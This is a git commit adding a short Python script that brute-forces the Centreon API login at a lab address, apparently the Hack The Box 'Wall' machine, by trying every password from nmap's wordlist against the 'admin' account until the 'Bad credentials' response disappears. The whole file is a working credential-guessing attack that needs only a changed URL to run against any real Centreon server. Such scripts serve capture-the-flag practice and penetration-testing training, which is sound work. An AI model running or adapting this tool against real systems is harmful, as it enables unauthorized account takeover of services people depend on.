cfba83a43d105140cb071502a7e6641a842bf361
Med Boutaleb <51140478+m3dsec@users.noreply.github.com>
2019-10-14 12:25:07 +0100

    Create HTB_wall_api_BruteForce.py

---
+++ HTB_wall_api_BruteForce.py
@@ -0,0 +1,25 @@
+# ORIGINAL Code By ihebski
+# Edited By m3dsec
+import requests
+import sys
+
+url = "http://10.10.10.157/centreon/api/index.php?action=authenticate"
+expression = "Bad credentials"
+
+def brute(username,password):
+	data = {'username':username,'password':password}
+	r = requests.post(url,data=data)
+	if expression not in r.content :
+		print "[+] Correct password Found: ",password
+		sys.exit()
+	else:
+		print r.content," ",password
+
+def main():
+	words = [w.strip() for w in open("/usr/share/nmap/nselib/data/passwords.lst", "rb").readlines()] #parse wordlist
+	# nmap wordlist work just fine
+	for payload in words:
+		brute("admin",payload)
+
+if __name__ == '__main__':
+	main()
